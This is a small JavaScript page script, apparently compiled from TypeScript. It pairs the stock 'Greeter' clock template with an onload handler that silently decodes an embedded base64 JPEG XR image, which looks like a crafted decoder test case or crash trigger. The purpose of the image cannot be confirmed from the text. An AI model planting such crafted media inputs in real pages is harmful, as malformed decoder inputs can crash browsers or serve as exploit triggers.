var Greeter = (function () {
    function Greeter(element) {
        this.element = element;
        this.element.innerHTML += "The time is: ";
        this.span = document.createElement('span');
        this.element.appendChild(this.span);
        this.span.innerText = new Date().toUTCString();
    }
    Greeter.prototype.start = function () {
        var _this = this;
        this.timerToken = setInterval(function () {
            return _this.span.innerHTML = new Date().toUTCString();
        }, 500);
    };

    Greeter.prototype.stop = function () {
        clearTimeout(this.timerToken);
    };
    return Greeter;
})();

var JXRase = (function () {
    function JXRase() {
    }
    return JXRase;
})();

window.onload = function () {
    var image = new Image();
    image.onload = image.onerror = function () {
    };
    image.src = "data:image/vnd.ms-photo;base64,SUm8AQgAAAAJAAG8AQAQAAAAegAAAAK8BAABAAAAAAAAAAS8BAABAAAAAAAAAIC8BAABAAAAAgAAAIG8BAABAAAAAgAAAIK8CwABAAAAAADAQoO8CwABAAAAAADAQsC8BAABAAAAigAAAMG8BAABAAAAuQAAAAAAAAAkw91vA07+S7GFPXd2jckMV01QSE9UTwARRMBxAAEAAWAAoAAKAACgAAAAAQAAAAgAMP8ABEKAAAEAAAEBykUAAAAAAQI4GIGOEOIcaNEYRhtafaPkfgfuPzAAAAAAAAAAAAAAAAAAAAAAAAEDI/AcEzYgmbGE7Igl8IJfDCa4YTXCCRwgkcMJejCTwwk8MI88I8wiKgocpBP6QAmdCChzSCf0gBM7QUOUgn9IATO0FDlIJ/SAEzoQUOaQT+kAJnQgoc0gn9IATOg=";
};
//@ sourceMappingURL=app.js.map
